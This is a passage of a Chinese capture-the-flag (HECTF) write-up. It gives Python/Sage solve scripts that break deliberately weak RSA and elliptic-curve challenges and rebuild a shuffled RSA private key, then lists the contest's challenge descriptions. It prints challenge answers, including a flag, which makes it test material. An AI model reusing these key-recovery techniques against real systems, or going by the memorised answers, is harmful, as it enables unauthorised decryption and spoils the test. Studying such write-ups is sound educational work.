class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1)%(<span class="number">10</span>**(k+<span class="number">1</span>))) != (n%(<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i*(<span class="number">10</span>**<span class="number">77</span>), i*(<span class="number">10</span>**<span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span></span><br><span class="line">q = <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line">m = base64.b64decode(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#b&#x27;HECTF&#123;I_rea1ly_l0ve_c2ypto!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="不合格的魔药"><a class="markdownIt-Anchor" href="#不合格的魔药">#</a> 不合格的魔药：</h3><p>根据题目描述的提示可以看到题目中好几处参数不合理的地方，比如 p,q 的大小等，因为异或操作并不会把多余的部分去掉，所以密文中泄露了很多消息，但还有一个问题就是如何求 key，这时一个 ECDLP 问题，可以采用 MOV 攻击，不过既然参数不合理，也可以尝试爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line">q = <span class="number">7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line">a = <span class="number">4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line">b = <span class="number">5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line">x = <span class="number">5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403</span></span><br><span class="line">x1 = <span class="number">0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class="line">y1 = <span class="number">0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class="line">c = [<span class="number">36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820</span>, <span class="number">20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332</span>, <span class="number">19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277</span>, <span class="number">45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先求key，可以用MOV攻击，也可以直接爆破，这里直接爆破了</span></span><br><span class="line">Ep = EllipticCurve(GF(p), [a, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">G = Ep.lift_x(x)</span><br><span class="line">hint1 = Ep(x1, y1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> hint1 ==  key * G:</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># key = 51517</span></span><br><span class="line"><span class="comment"># 然后求flag,可以用铜匠定理也可以构造格子</span></span><br><span class="line">n = p*q</span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">Cur=EllipticCurve(Zmod(n),[a,b])</span><br><span class="line">aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover</span>(<span class="params">x,y</span>):</span><br><span class="line">    M=Matrix(ZZ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">2</span>^<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>*x*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">256</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,(<span class="number">3</span>*x^<span class="number">2</span>+a)*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,-<span class="number">1</span>*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">256</span>,<span class="number">0</span>,-<span class="number">2</span>*y*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">512</span>,(x^<span class="number">3</span>+a*x-y^<span class="number">2</span>+b)*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,n*<span class="number">2</span>^<span class="number">512</span>]])</span><br><span class="line">    v=M.LLL()[-<span class="number">1</span>]</span><br><span class="line">    dx=<span class="built_in">int</span>(v[<span class="number">2</span>])//<span class="number">2</span>^<span class="number">256</span></span><br><span class="line">    dy=<span class="built_in">int</span>(v[<span class="number">4</span>])//<span class="number">2</span>^<span class="number">256</span></span><br><span class="line">    gx=x+dx</span><br><span class="line">    gy=y+dy</span><br><span class="line">    m.append(x^^gx)</span><br><span class="line">    m.append(y^^gy)</span><br><span class="line">recover(c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">recover(c[<span class="number">2</span>],c[<span class="number">3</span>])</span><br><span class="line">out=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    out+=aes.decrypt(long_to_bytes(i))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;HECTF&#123;&#x27;</span>+ out+ <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="情书与破碎的证书"><a class="markdownIt-Anchor" href="#情书与破碎的证书">#</a> 情书与破碎的证书</h3><p>首先我们需要知道证书的基本格式 在证书中必然含有 -----BEGIN PRIVATE KEY-----<br> 这一段可以拆成<br> 2d 2d 2d 2d 2d 42 45 47 49</p><p>4e 20 50 52 49 56 41 54 45</p><p>20 4b 45 59 2d 2d 2d 2d 2d<br> 和已经整理好的相比<br> 49 47 45 42 2d 2d 2d 2d 2d</p><p>45 54 41 56 49 52 50 20 4e</p><p>2d 2d 2d 2d 2d 59 45 4b 20<br> 很容易看出 1 和 9 换 2 和 8 换 3 和 7 换 4 和 6 换</p><p>我们将证书整理一下 可以得</p><p>30 82 04 bc 02 01 00 30 0d<br>06 09 2a 86 48 86 f7 0d 01<br>01 01 05 00 04 82 04 a6 30<br>82 04 a2 02 01 00 02 82 01<br>01 00 bd db 99 13 77 8d 23<br>15 44 9b 58 7f bd 7f 6e 41<br>94 4d 1c 9c 54 84 c9 b0 1f<br>bf 53 44 93 35 5c f8 84 89<br>cb f9 63 0f 42 99 bb 4d bb<br>84 df 7b d6 60 7b 7a 57 8f<br>84 e4 c6 d6 a7 0f 50 6c 16<br>a4 31 1b 15 08 e3 97 5d b7<br>1e 71 d6 d2 d1 7d d7 5b 9c<br>23 e2 d4 37 bc f7 f5 d9 50<br>6e 76 3c 71 22 a5 76 fd 5c<br>15 90 5a b4 5f eb a2 0a 24<br>12 86 28 5b 8b a5 d6 db d1<br>b7 d0 ce 97 5a b7 4e ae 33<br>8f e0 dd 5a 19 4d 02 91 8e<br>4f 0a d6 d1 60 f1 b7 30 74<br>3f c2 c8 eb 74 db 01 08 9d<br>21 0d 50 c5 aa 1f 25 97 93<br>b5 12 b2 6a 8f 3e 62 cc 6a<br>95 e9 ce f6 5e 5d 49 e9 e6<br>6d 35 2d db b1 40 8f a9 fe<br>5b 29 a1 64 2c 61 d2 c4 d3<br>2c 66 c5 6d d6 fa 36 39 b2<br>14 6b 1f 59 29 89 6a ba b4<br>b1 ed 35 ec f5 7d d6 30 ce<br>ca c1 5f cc 6b 74 3f 97 f0<br>86 f2 c6 04 0e 66 e9 1e 92<br>05 31 ba 61 2b e1 92 7b 67<br>54 52 5e 08 e5 19 02 03 01<br>00 01 02 82 01 00 04 62 04</p><p>中间被打碎了<br> d4 8d 90 d8 0f 02 81 80 51<br>a5 f7 e7 f4 c0 50 a5 0e 18<br>fd e1 2f ce e2 64 6f 2b 43<br>16 0b 0c 75 ab 49 25 e8 26<br>9a e8 0e 70 cf 12 73 4f 41<br>fa b1 8d 04 24 ed 7c ce b7<br>dd b2 7c be 0f 55 4f 7a 6e<br>16 98 d4 ec 5b a2 b4 8d 61<br>2e 23 37 ae b7 5f 8a 57 d8<br>15 5a 11 d0 7b 2c 49 d3 d9<br>7c 4f f0 cf b8 9e 6d d4 f3<br>6c c3 7c 01 0b 5b c8 93 56<br>a3 9b 57 6c c3 ed d0 3c dc<br>4d 79 1d f5 09 1a 55 71 df<br>1a 6c 15 ee da a0 77 3c f3<br>cf 02 81 80 0f c6 1f 05 d1<br>9c 96 ee c3 ed ca cc a3 4e<br>1d 3e 2c ab 43 9b eb ab 66<br>93 a3 ce 2c a9 9f 88 ab 9c<br>dd 18 3c eb 8e 80 1d 82 98<br>f8 35 35 98 64 ef 19 1d b3<br>f5 32 69 97 6b a0 4b 03 60<br>6e 54 08 59 de cd 05 80 5c<br>4a a7 9d c6 db 22 38 06 58<br>ea f0 bf fb a0 f4 e7 19 bc<br>f1 b1 e0 41 69 d8 e0 cb 3a<br>f4 d9 0b 2e 62 d7 c7 ed 30<br>45 d4 9b 52 5c a7 15 ca 3b<br>84 f0 7b 4e ce 27 d0 4d 17<br>95 29 9f a1 86 cd 02 81 80<br>25 c2 0a b2 52 9f 1e fd 3d<br>35 34 7c 57 3b 28 2a bf d9<br>5b 26 4c 92 f6 c4 f9 ec 8b<br>7c 71 32 06 fb ea 18 86 88<br>0e 29 a3 6c 47 ef 9b b7 53<br>ce 95 67 ea 4d 3e 08 3c 30<br>f3 44 02 2f 95 b7 cd 71 14<br>81 3b f6 a2 8e cc 67 d5 fe<br>05 95 32 42 68 4c d2 9c 1c<br>5d d8 a7 44 16 89 0e 5c 94<br>3c 70 90 4b a7 0e 34 9b 15<br>71 9a 46 6f 90 1f bf 0c fc<br>78 40 f8 03 2e 31 af bc cf<br>b8 4f 4a 81 7e a5 1c 8f 90<br>fd 6a 2d 2d 2d 2d 2d 45 4e<br>44 20 50 52 49 56 41 54 45<br>20 4b 45 59 2d 2d 2d 2d 2d</p><p>根据 rsa 证书格式 我们可以得到<br>标识头 30</p><p>总长度 82 04bc</p><p>版本信息 0201 00300d06092a864886f70d0101010500048204a6308204a2020100</p><p>n 02820101 00bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519</p><p>e 0203 010001</p><p>d 02820100</p><p>046204（没用）</p><p>q d48d90d80f（没用）</p><p>dp 028180</p><p>51a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf</p><p>dq 028180</p><p>0fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd</p><p>inv(q,p) 028180</p><p>25c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a</p><p><img data-src="https://i-blog.csdnimg.cn/direct/3be30da7583d4ebd84509ed31b1e9164.jpeg#pic_center" alt="在这里插入图片描述"></p><p>可以通过 openssl 进行一些了解 或者修补私钥 但不是本题的考点<br>（上图为 openssl 中修好的秘钥 可以看到十六进制部分是相同的）</p><p>得到这些后 我们就可以来一个简单的 dp 泄露<br>但是要注意，我之前提到了明文中有中文，所以我们需要使用 PKCS1_OAEP 解密器<br>传统的解密脚本无效</p><p>以下是脚本</p><p>from Crypto.PublicKey import RSA<br>from Crypto.Cipher import PKCS1_OAEP<br>from Crypto.Util.number import inverse, long_to_bytes<br>import binascii</p><p>hex_p = “0x00efaf90cae18eedc592a6cc57e6f4fb8812cd663274c90c0c82240b4a13c6d1772bab4f32f087cf3179f93513da0775529422f3c1ed5a0b8c2bd81bcd65a2451eab291585d1f39cc7dfc4c36ef2ff0e9be22d9252c80c7e11cd493542c27731965a5603dde878356433d07b99431eb69dc9856931583e9ced764503bded010857”<br>hex_q = “0x00cac7cc600b5e888df3f9e905d48d088d1a15819dbde1c8501028ffe3b02bf237acb277b43eda8a2110e9b6931cbfffe6eeade466611be17454f2d0c848a567e77065e82ff4f2aa0de7bfe1e622d060f67a5f6fc87e5859ed6aec857cf8124418b4c73a40628fdddd002504444acb31fb0b4ea35068ec8c1ffb933ed48d90d80f”<br>hex_e = “0x10001”<br>hex_c = “0x92c8bf09c04cf0193306f9203b19956fbcbe796c6e65fdaefeb49c5fb0391c1f78552d5fb4385ba3dfd11efb23759fdc386a2336e827b0be5b3514522b8063149d584edef58f2d64b4e8d6c9e5813de1d27b4c3fe970abfb4495700ed04b496bf1eb8d90b5a836ba3d852e0038d943ce116d691ec1490750c62b1cd19a1816ade9325c9ac739255b1c24e95cc387050ff521c3f60882efe33c66409498654ed39bc6c1253c21e3e78dc67937666a2ae64826cfe4767f24a5712069ec3a31e0f36ce4ef473041f8df8e553e72771d81b6ef75a95d29172483fcc33ea9c396f98af037527d4f6bd0cbf033e1f8263aba1f1cb35fca87e119c4b953526be191ada6”</p><p>p = int(hex_p, 16)<br>q = int(hex_q, 16)<br>e = int(hex_e, 16)<br>c = int(hex_c, 16)</p><p>n = p * q</p><p>phi_n = (p - 1) * (q - 1)</p><p>d = inverse(e, phi_n)</p><p>rsa_key = RSA.construct((n, e, d, p, q))</p><p># 使用 PKCS1_OAEP 初始化解密器<br> cipher = PKCS1_OAEP.new (rsa_key)</p><p># 将密文转为字节形式<br> ciphertext_bytes = long_to_bytes©</p><p>decrypted_message_bytes = cipher.decrypt(ciphertext_bytes)<br># 将解密后的字节数据转换为字符串，使用 UTF-8 解码<br> message = decrypted_message_bytes.decode (‘utf-8’)<br>print(“Decrypted Message:”, message)</p><p t1an_dog_no_g3t_g00d_d1e="">Decrypted Message: 你知道么，rsa 的大数分解的坚固就像爱情一样坚不可摧，你愿意让我们也像 rsa 一样坚不可摧么？但是你并不关心结局，你只关心你的 flag:HECTF</p><h1 id="题目描述记录"><a class="markdownIt-Anchor" href="#题目描述记录">#</a> 题目描述记录：</h1><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2">#</a> Web：</h2><h3 id="are-u-happy"><a class="markdownIt-Anchor" href="#are-u-happy">#</a> <strong>Are u happy</strong></h3><p>题目描述：</p><blockquote><p>开始开心地玩耍吧！</p></blockquote><h3 id="baby_sql-2"><a class="markdownIt-Anchor" href="#baby_sql-2">#</a> <strong>baby_sql</strong></h3><p>题目描述：</p><blockquote><p>g01den 的公司里有个记录员工打卡的后台，只有 admin 才能登陆，但是，g01den 发现，每次去公司视察的时候公司里的员工总数始终和打卡了的员工数目对不上，g01den 怀疑公司里的某位员工利用了漏洞，于是他在后台程序里增加了一些 WAF，并且他对他自己的 WAF 很自信，并暗示了那位员工他在数据库里放了一个重要的信息（flag），能拿到这个信息（flag）的人年终可以获得额外的奖金。作为那位员工的你应该如何拿到这个信息获得奖金呢？ flag 由 HECTF 开头，得到的答案请将 hectf 修改为大写 HECTF，flag 中除了开头的 HECTF 外，无大写字母</p></blockquote><h3 id="baby_unserialize-2"><a class="markdownIt-Anchor" href="#baby_unserialize-2">#</a> <strong>baby_unserialize</strong></h3><p>题目描述：</p><blockquote><p>一个简单的反序列化，一个简单的 RCE</p></blockquote><h3 id="你一个人专属的进货网站-2"><a class="markdownIt-Anchor" href="#你一个人专属的进货网站-2">#</a> <strong>你一个人专属的进货网站</strong></h3><p>题目描述：</p><blockquote><p>w41tm00n 第一次学习开发网站，老板让他三天之内搞定。第二天，w41tm00n 终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是 w41tm00n 没学过网安的知识，写的网站存在漏洞你作为 w41tm00n 的好朋友，同时你是位网安的实习生，w41tm00n 就找到了你帮他测试网站是否存在漏洞。w41tm00n 跟你说，他放了一个线索在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag 文件）</p></blockquote><h3 id="ezweb-2"><a class="markdownIt-Anchor" href="#ezweb-2">#</a> <strong>ezweb</strong></h3><p>题目描述：</p><blockquote><p>Try to be admin to get flag！！！</p><p><strong>提示 1</strong>Hint：xxxxx 为 c、e、f、h、t 这五个没大没小的字母</p></blockquote><h3 id="ezjava-2"><a class="markdownIt-Anchor" href="#ezjava-2">#</a> ezjava</h3><p>题目描述：</p><blockquote><p>A 了这道题，我就承认你是真正的奶龙</p></blockquote><h2 id="re-2"><a class="markdownIt-Anchor" href="#re-2">#</a> Re</h2><h3 id="babyre-2"><a class="markdownIt-Anchor" href="#babyre-2">#</a> <strong>babyre</strong></h3><p>题目描述：</p><blockquote><p>g01den 最近学会了一个简单的算法，于是他迫不及待的写下了这个程序。同时他在这个程序里面藏了一些秘密，你能发现他藏在程序里面的秘密吗？</p></blockquote><h3 id="littleasm"><a class="markdownIt-Anchor" href="#littleasm">#</a> <strong>littleasm</strong></h3><p>题目描述：</p><blockquote><p>百行代码里的藏匿的 flag</p></blockquote><h3 id="pepy"><a class="markdownIt-Anchor" href="#pepy">#</a> <strong>PE?py?</strong></h3><p>题目描述：</p><blockquote><p>在 pyre 里找到压缩包密码</p></blockquote><h3 id="easyree"><a class="markdownIt-Anchor" href="#easyree">#</a> <strong>easyree</strong></h3><p>题目描述：</p><blockquote xxxx=""><p>flag 格式 HECTF</p></blockquote><h3 id="ezandroid"><a class="markdownIt-Anchor" href="#ezandroid">#</a> <strong>ezAndroid</strong></h3><p>题目描述：</p><blockquote></blockquote><h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2">#</a> Pwn</h2><h3 id="sign-in-2"><a class="markdownIt-Anchor" href="#sign-in-2">#</a> <strong>sign in</strong></h3><p>题目描述：</p><blockquote><p>快来签到吧…</p></blockquote><h3 id="find-eggy-2"><a class="markdownIt-Anchor" href="#find-eggy-2">#</a> <strong>find eggy</strong></h3><p>题目描述：</p><blockquote></blockquote><h3 id="arcaea_sorting-2"><a class="markdownIt-Anchor" href="#arcaea_sorting-2">#</a> <strong>Arcaea_Sorting</strong></h3><p>题目描述：</p><blockquote><p>–为何我的眼里常含泪水，因为我爱这 libc，爱得深沉  (<em><sup>▽</sup></em>)</p><p>听好了：</p><p>XX 月 XX 日，g01den 自制的查分系统正式完工，每个部署了该系统的服务器都将会迎来一场漩涡，为这些服务器带来全新的危机。</p><p>你所购买的服务器都将迎来黑客的试炼，你所熟悉的服务器都将加诸栈溢出的历练。</p><p>至此，一锤定音。</p><p>尘埃，已然落定。</p><p>#HECTF #听好了 #韵律源点</p></blockquote><h3 id="arcaea_sorting_revenge-2"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge-2">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3><p>题目描述：</p><blockquote><p>g01den 得知他写的查分器存在漏洞，他害怕到大晚上睡不着，第二天一早火急火燎地把程序重写了，但是他突然发现他学艺不精，突然不会写链表数据结构了，于是，他将查分器改成了存储分数的存储器，希望这次不会出现安全性问题。</p></blockquote><h3 id="喵喵喵"><a class="markdownIt-Anchor" href="#喵喵喵">#</a> <strong>喵喵喵</strong></h3><p>题目描述：</p><blockquote></blockquote><h3 id="lip"><a class="markdownIt-Anchor" href="#lip">#</a> <strong>lip</strong></h3><p>题目描述：</p><blockquote></blockquote><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2">#</a> Crypto</h2><h3 id="迷茫的艾米莉-2"><a class="markdownIt-Anchor" href="#迷茫的艾米莉-2">#</a> <strong>迷茫的艾米莉</strong></h3><p>题目描述：</p><blockquote><p>题目描述：迷茫的艾米莉 描述：在维吉尼亚小镇，园丁艾米莉的 responsibility 是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文 Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p></blockquote><h3 id="翻一翻-2"><a class="markdownIt-Anchor" href="#翻一翻-2">#</a> <strong>翻一翻</strong></h3><p>题目描述：</p><blockquote><p>小明最近失恋了，翻来覆去睡不着，请帮他找出失恋的关键信息</p></blockquote><h3 id="seven-more-2"><a class="markdownIt-Anchor" href="#seven-more-2">#</a> <strong>seven more</strong></h3><p>题目描述：</p><blockquote><p>more than more no co-prime</p></blockquote><h3 id="情书与破碎的证书-2"><a class="markdownIt-Anchor" href="#情书与破碎的证书-2">#</a> <strong>情书与破碎的证书</strong></h3><p>题目描述：</p><blockquote><p>小明喜欢上了小红，他使用 rsa 向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成 16 进制，以九个为一组用相同的方式打乱（转化时产生的 0d0a 换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</p><p><strong>提示 1</strong> 情书与破碎的证书 hint1: 字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt () 解密密文（毕竟考点是证书）</p></blockquote><h3 id="不合格的魔药-2"><a class="markdownIt-Anchor" href="#不合格的魔药-2">#</a> <strong>不合格的魔药</strong></h3><p>题目描述：</p><blockquote><p>刚开始学习魔药的小 A 总是只关注魔药的颜色而忽略配比，这次他配置的魔药又是这样，这样一份不合格的魔药完全没办法达到对信息 “保密” 的效果了，请从这份面目全非的成品中还原出小 A 想隐藏的信息</p></blockquote><h2 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2">#</a> Misc</h2><h3 id="rem_you"><a class="markdownIt-Anchor" href="#rem_you">#</a> <strong>Rem_You</strong></h3><p>题目描述：</p><blockquote></blockquote><h3 id="funny"><a class="markdownIt-Anchor" href="#funny">#</a> <strong>funny</strong></h3><p>题目描述：</p><blockquote 省-市-广场名字-水边名字=""><p>看了半天电脑的小明非常劳累，便摸鱼去楼下的广场逛一逛但觉得广场太吵闹了，又去了水边看大爷们钓鱼，你能找出小明去的广场和水边的名字嘛</p><p>flag 格式  HECTF {北京市 - 区 - 广场名字 - 水边名字}   HECTF</p></blockquote><h3 id="简单的压缩包-2"><a class="markdownIt-Anchor" href="#简单的压缩包-2">#</a> <strong>简单的压缩包</strong></h3><p>题目描述：</p><blockquote><p>w41tm00n 是个 kisaki 推，某天在水群的时候，一个同为 kisaki 推的 g01den 在群里分享了个压缩包，并留言里面有一张 kisaki 的图，同时里面还存在着神秘的信息（这里是 flag），w41tm00n 对此很感兴趣，你可以帮他得到神秘的信息（flag）吗？</p></blockquote><h3 id="恶势力的仓库"><a class="markdownIt-Anchor" href="#恶势力的仓库">#</a> <strong>恶势力的仓库</strong></h3><p>题目描述：</p><blockquote><p>恶势力的仓库惨遭毒手，就代表着毒手伸进了恶势力的仓库</p></blockquote><h3 id="恶势力的聊天记录"><a class="markdownIt-Anchor" href="#恶势力的聊天记录">#</a> 